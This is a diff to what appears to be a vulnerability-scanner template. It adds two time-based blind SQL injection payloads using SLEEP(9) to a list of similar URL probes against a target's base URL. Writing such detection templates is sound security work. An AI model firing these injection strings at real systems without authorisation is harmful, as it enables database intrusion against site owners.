@@ -16,6 +16,8 @@ requests:
       - "{{BaseURL}}?/0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z/"      
       - "{{BaseURL}}/0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z"      
       - "{{BaseURL}}/(SELECT(0)FROM(SELECT(SLEEP(9)))a)/"
+      - "{{BaseURL}}/' AND (SELECT 5735 FROM (SELECT(SLEEP(9)))YpRn) AND 'Jswp'='Jswp"
+      - "{{BaseURL}}?id=' AND (SELECT 5735 FROM (SELECT(SLEEP(9)))YpRn) AND 'Jswp'='Jswp"      
       - "{{BaseURL}}/,(select * from (select(sleep(9)))a)/"
       - "{{BaseURL}}/1) or sleep(9)#/"   
       - "{{BaseURL}}/1' and sleep(9)"   
